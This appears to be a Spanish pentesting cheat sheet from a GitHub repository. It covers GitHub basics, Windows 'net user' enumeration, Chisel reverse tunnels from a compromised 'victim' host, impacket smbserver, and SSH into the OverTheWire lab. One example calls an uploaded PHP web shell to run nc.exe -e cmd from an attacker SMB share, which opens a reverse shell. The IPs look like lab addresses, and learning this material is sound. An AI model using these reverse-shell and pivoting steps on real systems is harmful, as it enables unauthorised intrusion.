
# ¿Qué es GitHub?

Github es un portal creado para alojar el código de las aplicaciones de cualquier desarrollador, y que fue comprada por Microsoft en junio del 2018.
La plataforma está creada para que los desarrolladores suban el código de sus aplicaciones y herramientas, y que como usuario no sólo puedas
descargarte la aplicación, sino también entrar a su perfil para leer sobre ella o colaborar con su desarrollo.

Git se utiliza también como sistemas de control, ya que permite comparar el código de un archivo para ver las diferencias entre las versiones, restaurar versiones
antiguas si algo sale mal, y fusionar los cambios de distintas versiones. También permite trabajar con distintas ramas de un proyecto, como la de desarrollo
para meter nuevas funciones al programa o la de producción para depurar los bugs.

Github permite que los desarrolladores alojen proyectos creando repositorios de forma gratuita. Pero hay que tener una cosa en mente, y es que para poder subir gratis
los proyectos deberán ser de código abierto. Y no quieres que tu aplicación sea de código abierto, la plataforma también tiene una versión de pago para alojar proyectos
de forma privada.


# rlwrap nc

Como añardir rlwrap a netcat para aplicar una shell interactiva.



# Comandos Terminal CMD Windows

## Ver Usuarios

Este comando tiene la tarea de enumerar todas las cuentas de usuario existentes en el sistema donde se incluyen la cuentas ocultas o cuentas de usuario deshabilitadas.
Estas cuentas de usuario se enumeran con su nombre interno asignado.

    net user
      
Podremos almacenar los resultados en un archivo de texto usando la siguiente sintaxis:

    net user > archivo.txt

También podemos indicar una ruta personalizada si así lo deseamos:
 
    net user > “ruta\archivo.txt
    
### Ver información detallada de un Usuaerio

Para obtener información mucho más detallada de un usuario del sistema, podemos ejecutar lo siguiente. Allí
vemos información precisa y completa sobre el usuario seleccionado.

    net user “usuario”

## Cambiar el nombre a un Archivo
    
Para cambiar el nombre de archivo2.txt por archivo3.txt, se puede usar el comando REN (o RENAME) escribiendo:

    REN archivo2.txt archivo3.txt 
    
    
# Crear un tunel con Chisel entre Linux y Windows:

##¿Qué es Chisel?

``Chisel es un túnel TCP/UDP rápido, transportado a través des servicio HTTP y protegido a través de SSH``. Esta escrito en Go  y utiliza el
protocolo de ``cliente`` a ``servidor``.  Chisel es principalmente útil para pasar a través de firewalls, aunque también se puede usar para 
proporcionar un punto final seguro en su red.

## Redireccionar puertos con Chisel a nuestra localhost:

Una vez hemos ganado acceso o tenemos la posibilidad de subir archivos y ejecutar comandos en el dispoditivo víctima, podemos crear un tunel
con ``chisel``. Mediante esta herramienta podremos establecer una conexión de ``cliente`` a ``servidor`` y conectar dos puertos entre si.
Básicamente conectamos un puerto de la máquina víctima con uno de nuestro equipo, de tal forma, que podemos ejecutar cualquier herramienta en 
local utilizando ese puerto, y automaticamente se redireccionara el ataque a la maquina victima.

### Establecer conexión por parte del Servidor (Linux):

En primer lugar, debemos de estabecer ``Chisel`` en modo ``Servidor`` en nuestro sistema Linux, para ello debemos de asegurarnos que la versión de
Chisel instalada es la adecuada para nuestra distribución. Para establecer nuestro sistema como servidor simplemente ejecutamos el siguiente comando
especificando el puerto que por el que vamos a establecer la conexión. Es importante que este puerto no se encutre en us.

    chisel serve --reverse --port [Puerto Local Conexión] 
    
    ./chisel serve --reverse -p [Puerto Local Conexión] 

``Ejemplo``

    chisel serve --reverse -p 8081

Aquí podemos ver como en el ejemplo hemos establecido un servicio de servidor con Chisel por el puerto 8081, este puerto es el que posteriormente
tendremos que especificar en el servicio por parte del Cliente para realizar la conexión.
    

### Establecer conexión por parte del Cliente (Windows):

Para establecer Chisel en un sistema Windows como ``Cliente``, nos descargamos la versión especifica para Windows (debemos de comprobar 
si el sistema es de 32 o 64 bits) y ejecutamos el siguiente comando. En el debemos especificar el puerto por el que vamos a comunicarnos 
con nuestro servicio ``Servidor`` y los puestos que vamos a comunicar entre si:


    .\chisel.exe client [Ip Local]:[Puerto de Conexión] R:[Puerto Víctima]:127.0.0.1:[Puerto Local]
    
``[Ip Local]``: Es la Ip de nuestro sistema Servidor. O en caso de estar conectados por VPN su Ip pública.  
    
``[Puerto de Conexión]``: Es el puerto establecido en la conexión con el Servidor. Debe ser el mismo puerto que especificado en el sistema Linux.  
    
``[Puerto Víctima]`` y ``[Puerto Local]``: El puerto Víctima pasará a ser el puerto local de nuestro local host 127.0.0.1.
    
    



---

# Crear recurso compartido con Smbserver:


    smbserver.py smbFolder $(pwd) -smb2support
    
    
De esta forma crearemos un recurso compartido a nivel de red que al cual podremos acceder desde cualquier navegador y pudiendo ver y compartir
archivos.

Para acceder a este recurso compartido simplemente escribimos nuestra Ip en el navegador seguido del nombre que le hemos dado a la carpeta compartida,
en este caso ``smbFolder``.

``Ejemplos``:

Mostrar con dir los recursos compartidos:
  
    http://10.10.10.198:8080/upload/kamehameha.php?telepathy=dir \\10.10.14.75\smbFolder\
    

Ejecutar nc.exe a través del navegador, tendremos que especificar una direccion y un puerto de escucha:

    http://10.10.10.198:8080/upload/kamehameha.php?telepathy=\\10.10.14.75\smbFolder\nc.exe -e cmd [Ip Atacante] [Puerto en Escucha]
    
    
---


    
# SSH

## Puerto predeterminado SSH:

La comunicación inalámbrica o por cable entre dos máquinas se realiza a través de puertos. Hay un total de 65,536 puertos de comunicación y la 
comunicación puede tener lugar a través de cualquiera de estos puertos. SSH se comunica por defecto a través del puerto 22. Cuando ejecutamos el 
comando anterior, la conexión entre el cliente local y el servidor se establece a través del puerto 22 y toda la comunicación se realiza a través 
de este puerto.

## Especificar puerto de conexión con SSH

En ocaciones, ``se puede modificar el puerto por el cual se conecta SSH``. En caso de no especificar ningún puerto SSH se conectará por defecto por
el puerto 22. En caso de querer especificar otro puerto lo podemo hacer con la opción ``-p`` seguido del puerto en cuestion.


    ssh [Usuario]@[Dirección] -p [Puerto]
    
    
# Ejemplo de conexión SSH:

Para realizar un ejemplo de como conectarno a otro equipo utilizando SSH vamos a utilizar la web ``https://overthewire.org``. Está página está 
enfocada en enseñar los parámetros básicos de Linux y SSH a través de distintos laboratorios. A estos laboratorios nos conetaremos a través de
SSH y la finalidad de cada practica es encontrar la flag secreta oculta en cada sistema. La flag encontrada es la contraseña para poder conectarnos
al siguiente nivel. 

En este ejemplo únicamente mostraremos como conectarnos a través de SSH, para ver todas practicas de ``OverTheWire`` podeís encontrarlas en la 
sección de Laboratorios.

En primer lugar abrimos la página oficial de Over The Wire:

![Captura de pantalla 2022-10-12 220427](https://user-images.githubusercontent.com/103068924/195438160-e7db9a69-f9d1-4ee9-b8dd-a494988ad836.png)

Una vez abierta nos dirigimos al ``Nivel 0``:

![Captura de pantalla 2022-10-12 221133](https://user-images.githubusercontent.com/103068924/195438319-f437c607-eae0-4a8a-84f1-59b286582a8c.png)

Vemos como nos dice que el nombre del usuario es ``bandit0`` que la contraseña es ``bandit0`` también, la dirección es ``bandit.labs.overthewire.org``
y nos indica que debemos utilizar el ``puerto 2220``:

    ssh bandit0@bandit.labs.overthewire.org -p 2220 
    
Una vez ejeuctado el comando anterior, nos pedirá la contraseña, la introducimos y ya tendremos acceso al 
otro equipo:

![Captura de pantalla 2022-10-12 221350](https://user-images.githubusercontent.com/103068924/195438782-444534be-f275-4742-a489-8f93d475accf.png)

![Captura de pantalla 2022-10-12 221444](https://user-images.githubusercontent.com/103068924/195439083-539b1748-e770-40c1-bb04-97c0a24a6f91.png)





    
